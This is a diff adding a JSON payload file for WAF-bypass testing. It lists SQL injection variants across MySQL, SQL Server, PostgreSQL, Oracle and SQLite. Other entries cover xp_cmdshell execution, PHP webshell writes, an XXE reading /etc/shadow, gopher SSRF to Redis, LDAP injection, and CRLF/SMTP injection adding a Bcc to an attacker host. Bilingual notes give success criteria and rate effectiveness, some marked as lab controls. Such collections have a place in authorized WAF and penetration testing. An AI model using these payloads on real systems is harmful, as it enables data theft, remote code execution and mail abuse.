+     "expectedCommand": "id2='union all select * from users--\n%C0%80'+union+select+col1,col2,col3+from+table+--+\n' union select current_user, 2#\n0 union/**/select 1,version(),@@datadir\n1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-\namUserId=1 union select username,password,3,4 from users\n%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201\n%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29\n%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201",
+     "description": {
+      "zh": "与 execution[0] 逐字节相同，作为无 WAF 场景的对照组：先确认 7 条样例直连时的行为与判定依据，再叠加 WAF 复测对比拦截与放行差异；本条不提供额外绕过变体。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Byte-identical to execution[0]; serves as the no-WAF control group: confirm how the 7 samples behave when directly connected, then retest behind the WAF to compare blocking differences. This entry adds no extra bypass variant. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 3,
+     "expectedCommand": "0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user",
+     "description": {
+      "zh": "保留原集合中的重复复测行，修复后分别验证边界规范化和数据库分词。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Preserves the original duplicate retest line for separate post-fix verification of edge normalization and database tokenization. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "/*!50000SELECT*/1--\n/*!UNION*//*!SELECT*/1,2,3--\n%55NION %53ELECT 1,2,3--\nuni/**/on sel/**/ect 1,2,3--\nunio%6e selec%74 1,2,3--\n1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 1=0 OR 1=1--\n1'||(SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5))||'",
+     "title": {
+      "zh": "WAF 绕过：规范化变体集合",
+      "en": "Normalization Variant Collection"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli2-blind-conditional-time-and-predicate-probes",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "1 AND (select DCount(last(username)) from users where username='ad1min')",
+     "description": {
+      "zh": "保留原始复测行，比较边界规范化与数据库真假/时间结果；测试时不得使用真实文件和账户条件。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Preserves original retest lines for comparing edge normalization with database Boolean or timing behavior; replace real file and account predicates during testing. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "auth2-origin",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "https://{ATTACKER_HOST} \n http://{ATTACKER_HOST}",
+     "description": {
+      "zh": "把任意外部 Origin 逐条置于请求；响应反射该 Origin 并附带凭据放行头，即确认任意 Origin 反射。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Place each arbitrary external Origin into the request; the response reflecting that Origin with credential-granting headers confirms arbitrary Origin reflection. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control",
+     "title": {
+      "zh": "Origin 任意反射",
+      "en": "Arbitrary Origin Reflection Verification"
+     }
+    }
+   ]
+  },
+  {
+   "id": "inject2-graphql-introspection",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 6,
+     "expectedCommand": "curl --fail-with-body --silent --show-error --max-time 5 -X POST \"http://127.0.0.1:18080/graphql\" -H \"Authorization: Bearer graphql-lab-token\" -H \"Content-Type: application/json\" -H \"X-Request-ID: graphql-introspection-boundary-001\" --data '{\"query\":\"query SchemaExposure{__schema{queryType{name}}}\"}' | jq -e '.data.__schema.queryType.name or .errors'",
+     "description": {
+      "zh": "以固定实验角色只查询 queryType.name，并将 data 或 errors 与登记的可见性策略比较。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Query only queryType.name as one fixed lab role and compare data or errors with the registered visibility policy. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "httpbypass-inline-xxe-filter-differential",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "<!DOCTYPE a [<!ENTITY e SYSTEM '/etc/shadow'> ]>",
+     "description": {
+      "zh": "WAF 与解析器一致性复测 — 修复后用同一最小外部实体声明分别复测边界设备与后端解析器：两侧都应拒绝外部实体；任一侧仍放行即说明两侧判定仍不一致。受控样例：用于建立基线/对照，非独立绕过手法。",
+      "en": "Preserves the original duplicate line for post-fix verification that both the edge and backend parser reject external entities. Controlled sample: establishes a baseline or comparison point, not a standalone bypass technique."
+     },
+     "kind": "control"
+    }
+   ]
+  },
+  {
+   "id": "sqli-mssql-xp-cmdshell",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; EXEC('EXEC master..xp_cmdshell ''whoami''')--\n'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--",
+     "title": {
+      "zh": "SQL Server xp_cmdshell 能力边界变体",
+      "en": "SQL Server xp_cmdshell Capability Boundary Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-time-mssql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; IF (1=1) WAITFOR DELAY '00:00:01'--",
+     "title": {
+      "zh": "SQL Server WAITFOR 一秒延迟变体",
+      "en": "SQL Server WAITFOR One-Second Delay Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-time-postgresql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; SELECT pg_sleep(1) WHERE 1=1--\n'; SELECT pg_sleep(1) WHERE 1=2--",
+     "title": {
+      "zh": "PostgreSQL pg_sleep 一秒延迟变体",
+      "en": "PostgreSQL pg_sleep One-Second Delay Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-time-oracle",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('PAYLOADER_TEST_PIPE',1) FROM DUAL--",
+     "title": {
+      "zh": "Oracle 一秒过程与 Pipe 延迟变体",
+      "en": "Oracle One-Second Procedure and Pipe Delay Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-boolean-blind",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--\n' AND LEFT(database(),1)>'a'--\n' AND RIGHT(LEFT(database(),2),1)='d'--\n' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--\n' AND (SELECT CONV(HEX(SUBSTR('PAYLOADER_MARKER',1,1)),16,10))>96-- -\n' AND (SELECT ORD(MID('PAYLOADER_MARKER',1,1))&0x40)=0x40-- -\n' AND ORD(MID('PAYLOADER_MARKER',1,1))>96-- -\n' AND (SELECT LENGTH('PAYLOADER_MARKER'))>0-- -",
+     "title": {
+      "zh": "固定 Marker 布尔盲注差分变体",
+      "en": "Fixed-Marker Boolean Blind Differential Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-postgresql-union-enumeration",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--",
+     "title": {
+      "zh": "PostgreSQL UNION 与目录枚举变体",
+      "en": "PostgreSQL UNION and Catalog Enumeration Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-stacked-mysql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' %3B SELECT user()--\n' ;%0a SELECT user()--\n' ; /*!SELECT*/ user()--\n'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--",
+     "title": {
+      "zh": "MySQL 堆叠语句边界变体",
+      "en": "MySQL Stacked-Statement Boundary Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-stacked-mssql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; IF(1=1) EXEC(N'SELECT N''PAYLOADER_MARKER'' AS marker');--\n'; DECLARE @s NVARCHAR(100)=N'SELECT N''PAYLOADER_MARKER'' AS marker'; EXEC sp_executesql @s;--",
+     "title": {
+      "zh": "SQL Server 堆叠语句边界变体",
+      "en": "SQL Server Stacked-Statement Boundary Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli-stacked-postgresql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "'; SELECT pg_sleep(1) WHERE 1=1;--\n'; DO $$ BEGIN RAISE NOTICE 'PAYLOADER_MARKER'; END $$;--",
+     "title": {
+      "zh": "PostgreSQL 堆叠语句边界变体",
+      "en": "PostgreSQL Stacked-Statement Boundary Variants"
+     }
+    }
+   ]
+  },
+  {
+   "id": "sqli2-oracle",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "' aNd 1=UtL_InAdDr.GeT_HoSt_AdDrEsS((SeLeCt banner FrOm v$version WhErE RoWnUm=1))--",
+     "description": {
+      "zh": "绕过区分大小写的特征匹配：保留语义仅变形大小写；报错仍回显版本即成功。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。",
+      "en": "Preserve semantics while only mutating case against case-sensitive matching; the error still echoing the version confirms success. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli2-sqlite-attach-database-file-write",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "aTTach dATabase '{WEB_ROOT}/{SHELL_NAME}' as lol;creAte tAble lol.pwn(dataz text);insErt inTo lol.pwn values('<?php @eval($_POST[c]);?>');detAch lol;",
+     "description": {
+      "zh": "绕过区分大小写的 ATTACH DATABASE 规则：仅变形大小写保持语义；文件成功落地即成功。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。",
+      "en": "Mutate only case while preserving semantics against case-sensitive ATTACH rules; the file landing successfully confirms success. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "auth2-login-sql-injection",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "admin%27%20oR%20%271%27%3D%271\nadmin%27--",
+     "description": {
+      "zh": "绕过登录表单的明文特征过滤：载荷百分号编码并混合大小写；认证通过或用户面板跳转即成功。失效条件：WAF 标准解码会先还原一层百分号编码，编码行随即失效；剩余大小写维度仅对区分大小写的自研正则/旧版规则有效，ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。",
+      "en": "Percent-encode and case-mix the payload against plaintext login-form filters; a passed authentication or user-panel redirect confirms success. Standard WAF decoding restores the percent-encoding first and the encoded lines die immediately; the remaining case dimension only works against case-sensitive self-built regex or legacy rules, and ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine normalize case before SQLi detection, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "browser-websocket-sql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "{\"TYPE\":\"message\",\"Content\":\"1' uNiOn sElEcT 1,2,3--\"}",
+     "description": {
+      "zh": "绕过按 type/content 小写键取值的检测逻辑：键名大小写变形测试后端匹配宽松度；消息仍被处理且注入生效即成功。失效条件：仅对按大小写不敏感方式读取 JSON 键的实现成立，严格键名匹配的后端会直接忽略变形键；现代检测在归一化后与基线等价，判 C。",
+      "en": "Mutate key case to test lenient backend matching of type/content keys; the message still handled with an effective injection confirms success. Only works where the backend reads JSON keys case-insensitively; strict key matching ignores the mutated keys outright, and modern detection is baseline-equivalent after normalization, rated C."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-mysql-basic",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "' UnIoN SeLeCt 1,database(),3--\n' uNiOn SeLeCt 1,user(),3--",
+     "description": {
+      "zh": "以大小写混合提交相同 UNION 语句；查询仍执行并返回与基线一致的结果即确认大小写过滤被绕过。失效条件：仅对区分大小写的自研正则/旧版规则有效；ModSecurity v3/CRS、Cloudflare、AWS WAF、雷池在 SQLi 检测前均做大小写归一化，现代环境判 C。",
+      "en": "Resubmit the same UNION with mixed case; the query still executes and returns baseline-consistent results, confirming case filtering is bypassed. Only works against case-sensitive self-built regex or legacy rules; ModSecurity v3/CRS, Cloudflare, AWS WAF, and SafeLine all normalize case before SQLi detection, so modern environments rate this C."
+     },
+     "effectiveness": "C"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "' /*!UNION*/ /*!SELECT*/ 1,database(),3--\n' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
+     "description": {
+      "zh": "用 MySQL 版本注释 /*!*/ 包裹关键字提交；第一条语句回显 database() 值、第二条返回与基线一致的占位结果，即确认版本注释绕过有效。失效条件：仅对不规范化 MySQL 注释的正则规则有效；ModSecurity v3/CRS 等现代 WAF 会剥离或规范化注释后再匹配，现代环境判 C。",
+      "en": "Wrap keywords in MySQL version comments; the statement still executes and returns database(), confirming the version-comment bypass works. Only works against regex rules that skip MySQL comment normalization; modern WAFs such as ModSecurity v3/CRS strip or normalize comments before matching, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-mssql-basic",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "'/**/UNION/**/SELECT/**/1,2,3--\n' UN%00ION SELECT 1,2,3--",
+     "description": {
+      "zh": "以注释分词与空字节变体提交 UNION；语句仍执行并返回相同结果即确认注释/空字节绕过有效。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。本条 UN%00ION 形态另需 2000s 时代 IIS+ASP 对 %00 截断处理不当才成立，现代 IIS/网关已正确处理。",
+      "en": "Resubmit UNION with comment tokenization and null-byte variants; the statement still executes with identical results, confirming the comment/null-byte bypass. Fails on modern stacks: only PHP below 5.3.4 or custom C-level truncation honors the null byte, and modern parsers are fixed. The UN%00ION form additionally needs the flawed null-byte truncation of IIS with ASP from the 2000s era; modern IIS and gateways handle it correctly."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "nosql2-ldap-filter-ext",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "*)(uid=*))%00",
+     "description": {
+      "zh": "绕过对过滤器尾部拼接的校验：注入后补空字节截断残余语法；查询返回注入目标即成功。失效条件：仅 PHP<5.3.4 或自研 C 层截断成立，现代解析器已修复。本条 LDAP 过滤器形态另依赖老旧 C 实现的 NUL 截断语义；OpenLDAP、JNDI、AD 等现代库对 NUL 要么拒绝要么按字面处理。",
+      "en": "Truncate residual filter syntax with an injected null byte; the query returning the injected target confirms success. Fails on modern stacks: only PHP below 5.3.4 or custom C-level truncation honors the null byte, and modern parsers are fixed. The LDAP filter form additionally relies on NUL truncation semantics of legacy C implementations; modern libraries such as OpenLDAP, JNDI, and AD either reject NUL or treat it literally."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-second-order",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "admin%2527%2520--",
+     "description": {
+      "zh": "绕过只解码一次的输入过滤：闭合引号与注释二次编码；二阶查询报错即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Double-encode the closing quote and comment past single-decode filters; an error in the second-order query confirms success. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    },
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "admin＇ OR ＇1＇=＇1\ntest@test.com' UNION SELECT password FROM users WHERE '1'='1\n\\x27 OR 1=1--",
+     "description": {
+      "zh": "分别用全角引号（＇）、UNION 变体与 \\x27 十六进制转义构造条件，验证依赖字符形态的过滤是否被绕过。失效条件：MySQL 不把 U+FF07 当引号，仅应用做全半角归一化或 GBK 转码时成立；\\x27 也非 SQL 层转义，需应用层 stripcslashes 类处理，现代环境判 C。",
+      "en": "Builds conditions with fullwidth quotes, a UNION variant, and the \\x27 hex escape to test filters that depend on character form. MySQL never treats U+FF07 as a quote, so this needs full-to-half-width normalization or GBK conversion in the application; the \\x27 form additionally needs an app-side stripcslashes-style pass, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli2-wordpress-url-wrapped-union-query",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "http://{LAB_APP}/?vulnparam=1%2520union%2520select%2520%2540%2540version,2--&ithemes-sync-request=1",
+     "description": {
+      "zh": "绕过 WordPress 侧只解码一次的过滤：空格与@二次编码；错误日志或响应差异出现即成功。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Double-encode spaces and @ against single-decode filtering in the WordPress layer; an error log entry or response delta confirms success. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "ssti2-svg-xxe-gopher-entity-request",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x SYSTEM \"gopher://127.0.0.1:6379/_INFO%250d%250aQUIT\">]><svg><text>&x;</text></svg>",
+     "description": {
+      "zh": "换行双重编码规避一次解码后的 CRLF 检测；成功判据：注入命令序列被执行。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Double-encodes newlines to survive single-decode CRLF inspection. Success: the injected command sequence executes. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "inject2-crlf-bcc-cc",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "%250a%250abcc: attacker@{ATTACKER_HOST}\n%250d%250aBcc: attacker@{ATTACKER_HOST}",
+     "description": {
+      "zh": "绕过一次解码后拦截换行的过滤器。成功判据：邮件产生额外密送收件人。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Bypasses newline filters applied after one decode. Success: the mail gains an extra Bcc recipient. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "inject2-subject",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "%250aSubject: Injected Subject\n%250d%250aSubject: Injected Subject",
+     "description": {
+      "zh": "第二层解码发生在邮件库组装头时。成功判据：邮件主题被替换或追加。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "The second decode happens when the mail library assembles headers. Success: the mail subject is replaced or appended. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "inject2-smtp-helo-mail-from-rcpt-to",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "%0aHELO {ATTACKER_HOST}%0d%0aMAIL FROM:<attacker@{ATTACKER_HOST}> \n %250aRCPT%2520TO:<victim@{TARGET}>",
+     "description": {
+      "zh": "编码与双重编码换行在 SMTP 会话层还原。成功判据：会话执行注入命令。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Encoded and double-encoded newlines resolve at the SMTP session layer. Success: the session executes injected commands. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "httpbypass-hpp-url",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "param=1%2526param=2\nparam=1%253bparam=2\nparam=1%257cparam=2",
+     "description": {
+      "zh": "双重编码分隔符在第二层解码时重新拆分。成功判据：后端取到双参数。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Double-encoded separators re-split at the second decode layer. Success: the backend receives both parameters. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "api2-variable-structured-filter",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "{\"query\":\"query($f:String!){users(filter:$f){id email}}\",\"variables\":{\"f\":\"{\\\"role\\\":\\\"%2561dmin\\\"}\"}}",
+     "description": {
+      "zh": "双重编码的过滤值在二次解析层还原。成功判据：还原后过滤命中 admin。失效条件：仅对做二次 URL 解码的架构成立。",
+      "en": "Double-encoded filter values resolve at the second parse layer. Success: the resolved filter matches admin. Only holds where the stack performs a second URL decode."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-expression-waf-variants",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "%u0027+AND+GREATEST(1,0)--",
+     "description": {
+      "zh": "绕过不识别 %u 系列编码的 WAF（IIS 场景）：用 %u0027 表示引号；数据库报错或条件差异出现即成功。失效条件：IIS 7+ 直接拒绝 %u 编码（返回 400），仅 IIS 6/5 存活，现代环境判 C。",
+      "en": "Use %u-style encoding for the quote on IIS targets whose WAF misses this form; a database error or conditional difference confirms success. Fails on IIS 7 and later, which reject percent-u encoding outright with a 400; only IIS 6/5 era stacks accept it, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "httpbypass-unicode-sql",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "%CA%BC+or+1%3D1--",
+     "description": {
+      "zh": "绕过对标准引号字符集的封锁：用 U+02BC 修饰字母撇号参与规范化还原；谓词生效引发差异即成功。失效条件：无任何主流标准化层把 U+02BC 映射为撇号，仅在自研 normalize 映射表存在的应用成立，现代环境判 C。",
+      "en": "Use the U+02BC modifier apostrophe to survive quote charset bans via normalization; an effective predicate causing a delta confirms success. No mainstream normalization layer maps U+02BC to an apostrophe, so this only works in applications shipping a custom normalize table, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    },
+    {
+     "area": "wafBypass",
+     "index": 2,
+     "expectedCommand": "＇ or '1'='1",
+     "description": {
+      "zh": "绕过对全角串整体匹配的规则：半角全角混排使特征不完整；登录或查询行为异常即成功。失效条件：MySQL 不把 U+FF07 当引号，仅应用做全半角归一化或 GBK 转码时成立，现代环境判 C。",
+      "en": "Mix halfwidth and fullwidth so signatures never fully match; anomalous login or query behavior confirms success. MySQL never treats U+FF07 as a quote, so this needs full-to-half-width normalization or GBK conversion in the application, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli-padding-comment-bypass",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 1,
+     "expectedCommand": "/*!50000SELECT*/ 'PAYLOADER_MARKER';",
+     "description": {
+      "zh": "绕过剥离标准注释后重组语句的 WAF：利用 MySQL 版本注释让内容在执行期还原；marker 回显即成功。失效条件：仅对不规范化 MySQL 注释的正则规则有效；ModSecurity v3/CRS 等现代 WAF 会剥离或规范化注释后再匹配，现代环境判 C。",
+      "en": "Abuse MySQL versioned comments so the payload is restored at execution time after comment stripping; an echoed marker confirms success. Only works against regex rules that skip MySQL comment normalization; modern WAFs such as ModSecurity v3/CRS strip or normalize comments before matching, rated C in modern environments."
+     },
+     "effectiveness": "C"
+    }
+   ]
+  },
+  {
+   "id": "sqli2-limit",
+   "patches": [
+    {
+     "area": "wafBypass",
+     "index": 0,
+     "expectedCommand": "1'/**/LIMIT(1)OFFSET(0)--",
+     "description": {
+      "zh": "绕过按空格分词识别 LIMIT 的规则：子句值括号化紧排；行集按预期截断即成功。失效条件：LIMIT(1) 括号形式仅 PostgreSQL/部分支持 LIMIT 表达式的方言合法，MySQL 对 LIMIT (1) 直接语法错误；MySQL 目标改用 LIMIT 0,1 注释分词形态（WB#1 已覆盖）。",
+      "en": "Parenthesize clause values with no spaces against space-tokenized LIMIT detection; the rowset truncating as expected confirms success. The parenthesized LIMIT form is only valid on PostgreSQL and dialects accepting LIMIT expressions; MySQL rejects LIMIT (1) as a syntax error, so use the comment-tokenized LIMIT 0,1 form there, already covered by another variant in this set."
+     },
+     "effectiveness": "B"
+    }
+   ]
+  }
+ ]
+}
